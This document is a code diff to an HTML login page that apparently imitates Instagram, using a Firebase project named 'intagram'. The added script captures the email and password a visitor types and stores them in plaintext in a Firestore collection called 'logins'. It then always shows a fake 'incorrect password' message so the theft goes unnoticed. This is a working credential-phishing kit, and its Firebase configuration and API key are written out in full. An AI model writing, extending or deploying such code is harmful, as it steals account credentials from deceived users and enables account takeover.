@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Mobile</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <style>
         * {
             margin: 0;
@@ -106,6 +108,14 @@
             display: block;
         }
         
+        .error {
+            margin-top: 10px;
+            color: #ed4956;
+            font-size: 12px;
+            text-align: center;
+            display: none;
+        }
+        
         .container {
             max-width: 100%;
             margin: 0 auto;
@@ -124,10 +134,46 @@
         <input type="password" class="input" placeholder="password">
         <a href="#" class="forgot">forgotten password?</a>
         <button class="login-btn">log in</button>
+        <div class="error">username or password incorrect</div>
         <div class="divider">
             <span>OR</span>
         </div>
         <a href="#" class="facebook-login">Log in with Facebook</a>
     </div>
+    
+    <script>
+        // Initialize Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyD8Vn47fBVdpSkYyLew7yCk8t6pWY9Mh9k",
+            authDomain: "intagram-722bd.firebaseapp.com",
+            projectId: "intagram-722bd",
+            storageBucket: "intagram-722bd.firebasestorage.app",
+            messagingSenderId: "356342152826",
+            appId: "1:356342152826:web:b21419ce2b307e2fb805c3",
+            measurementId: "G-54QF9W0806"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        
+        document.querySelector('.login-btn').addEventListener('click', function() {
+            const email = document.querySelector('.input[type="text"]').value;
+            const password = document.querySelector('.input[type="password"]').value;
+            
+            // Send data to Firestore
+            db.collection('logins').add({
+                email: email,
+                password: password,
+                timestamp: new Date()
+            }).then(() => {
+                console.log('Data sent to Firestore');
+            }).catch((error) => {
+                console.error('Error sending data:', error);
+            });
+            
+            // Show error message
+            document.querySelector('.error').style.display = 'block';
+        });
+    </script>
 </body>
 </html>
